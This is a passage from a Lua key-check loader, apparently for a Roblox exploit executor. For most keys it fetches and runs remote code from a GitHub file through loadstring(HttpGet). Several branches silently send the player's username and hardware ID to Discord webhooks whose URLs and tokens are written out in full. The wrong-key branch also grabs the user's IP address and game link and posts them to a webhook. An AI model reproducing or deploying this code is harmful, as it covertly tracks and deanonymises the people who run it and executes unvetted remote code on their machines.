local webh2 = "https://discord.com/api/webhooks/1031259899969163324/1hWH2azhDZifyNTkCG8fR36F1Z_twNZ7CIjrodlI8jZPgnci10cirI1kHKFnBGxK77Sw"    local res = (request or http_request or syn and syn.request)({    Url = "https://api.luauth.xyz/hwid",    Method = "GET"    })    if res.Success then    local index = string.find(res.Body, "Executor Name:")    if index then    pcall(function()            local data = {                ["embeds"] = {                    {                        ["title"] = game:GetService("Players").LocalPlayer.Name,                        ["description"] = string.sub(res.Body, 19, index - 5)                    }                }            }                     if syn then                local response = syn.request(                    {                        Url = webh2,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif request then                local response = request(                    {                        Url = webh2,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif http_request then                local response = http_request(                    {                        Url = webh2,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            end    end)    return    end    end

elseif key == "29ue92j-8912u8-138718" then -- Senarist
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
local webh1 = "https://discord.com/api/webhooks/1033135842564259880/5EDCepJFfSxac2ScQ3ieyR6BSXthg2Gcf9lnyPQQ4GXVf4-ZRgt61nNfKpUQsH3uTiC8"    local res = (request or http_request or syn and syn.request)({    Url = "https://api.luauth.xyz/hwid",    Method = "GET"    })    if res.Success then    local index = string.find(res.Body, "Executor Name:")    if index then    pcall(function()            local data = {                ["embeds"] = {                    {                        ["title"] = game:GetService("Players").LocalPlayer.Name,                        ["description"] = string.sub(res.Body, 19, index - 5)                    }                }            }                     if syn then                local response = syn.request(                    {                        Url = webh1,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif request then                local response = request(                    {                        Url = webh1,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif http_request then                local response = http_request(                    {                        Url = webh1,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            end    end)    return    end    end
elseif key == "190237u-81238-18237" then -- Bosta
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
local webh = "https://discord.com/api/webhooks/1033301263774920744/ZJXeGwpOZ_XOmCX7mBiNCqUOLUxMTf129OPD5K90G-MGMIHOkztByY98uRgfaHk23xYw"    local res = (request or http_request or syn and syn.request)({    Url = "https://api.luauth.xyz/hwid",    Method = "GET"    })    if res.Success then    local index = string.find(res.Body, "Executor Name:")    if index then    pcall(function()            local data = {                ["embeds"] = {                    {                        ["title"] = game:GetService("Players").LocalPlayer.Name,                        ["description"] = string.sub(res.Body, 19, index - 5)                    }                }            }                     if syn then                local response = syn.request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif request then                local response = request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif http_request then                local response = http_request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            end    end)    return    end    end
elseif key == "92j3912-1283y127-1293u1" then -- Denox
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
local webh123 = "https://discord.com/api/webhooks/1033692228943630426/np8wFzoPUB49cQ3cL4-2Jp1pPFAZQd7tDMwFlu2IK14BaRTvUjLkLquFzUCIvlQgPWH9"    local res = (request or http_request or syn and syn.request)({    Url = "https://api.luauth.xyz/hwid",    Method = "GET"    })    if res.Success then    local index = string.find(res.Body, "Executor Name:")    if index then    pcall(function()            local data = {                ["embeds"] = {                    {                        ["title"] = game:GetService("Players").LocalPlayer.Name,                        ["description"] = string.sub(res.Body, 19, index - 5)                    }                }            }                     if syn then                local response = syn.request(                    {                        Url = webh123,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif request then                local response = request(                    {                        Url = webh123,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif http_request then                local response = http_request(                    {                        Url = webh123,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            end    end)    return    end    end
elseif key == "5dg3qgq2-1g13geg3y127-1hrjerg34w" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
local webh133 = "https://discord.com/api/webhooks/1033445173461536788/DjQZ4UTo94UK_n3L7abF-7GdZsrPvtt0cqbzS7kX95UAdpvJm0do5XaEUbNl5cwNHoPv"    local res = (request or http_request or syn and syn.request)({    Url = "https://api.luauth.xyz/hwid",    Method = "GET"    })    if res.Success then    local index = string.find(res.Body, "Executor Name:")    if index then    pcall(function()            local data = {                ["embeds"] = {                    {                        ["title"] = game:GetService("Players").LocalPlayer.Name,                        ["description"] = string.sub(res.Body, 19, index - 5)                    }                }            }                     if syn then                local response = syn.request(                    {                        Url = webh133,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif request then                local response = request(                    {                        Url = webh123,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif http_request then                local response = http_request(                    {                        Url = webh133,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            end    end)    return    end    end

elseif key == "fıwhfp12-1283y1fasfjıp-12fhawp9fj3u1" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
elseif key == "asfasf-j5jsyh-1224s" then    
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
elseif key == "tqrqerf3q-hsfh4hA-fwfaf3g" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
elseif key == "g31dg3g1-g41ged1-5r231tg" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
elseif key == "gh4gaj3-1283g4g7-g41fd31" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
elseif key == "12uıegh-efluyheaf-1gıjajadf2w" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))() 
elseif key == "hfahwf-12fgwg7-ghtjag1" then
 loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
 elseif key == "jsdı29ud9h-asdhjwda-h281234" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
elseif key == "nsu2dhwuh-jası23hsd-j2ıasdh" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
elseif key == "jasud2hı-287wj278-hfyg1suwh" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
elseif key == "asdjndu3ghj-jasu2nkda-j2ush2" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
elseif key == "h1jfgksdhk-sdnwjsd-awdjasdhw" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
elseif key == "kdkskmw-jdckawawd-hjwdıashj" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
elseif key == "jwesod3wjaoj-asjwaıash-asjadwı" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
elseif key == "ksdkwkl-asjwdıj-jasıkjaw" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
elseif key == "jkaskdwajwalj-kawıwdk-jadwkadwj" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
elseif key == "kasoadwkwadl-jawdjkdw-awdjdawkdwa" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
elseif key == "hgshwjjmf-2hsu2asdj-hflasfj" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
elseif key == "senwehd-densajdwık-bendsden" then
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
else
    local globalwebh = "https://discord.com/api/webhooks/1033098384422211634/EIiNVh7L4OTI4utkWdZI66AdukP8j6sdDQCElT2m55qcErNrYdYvCkb6u0zvzaOKyhik"
local function notify(msg)
    game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "WARN",
    Text = msg
    })
    end 
    if res.Success then
    local index = string.find(res.Body, "Executor Name:")
    if index then
        local plr = game.Players.LocalPlayer
        local Content = ""
        local Embed = {
            ["color"] = "000000",
            ["description"] = "**Alert Reason:** False Key\n**Username:** " ..
                plr.Name ..
                    "\n**Game Link:** https://www.roblox.com/games/" ..
                        game.PlaceId ..
                            "\n\n**Hardware ID:** " ..
                                string.sub(res.Body, 19, index - 5) ..
                                    "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
            ["author"] = {["name"] = "Incorrect Key"}
        }
        (syn and syn.request or http_request or http.request) {
            Url = (globalwebh),
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService "HttpService":JSONEncode(
                {content = Content, embeds = {Embed}}
            )
        }
    end
end
notify("Leave This Game.")
end
end)
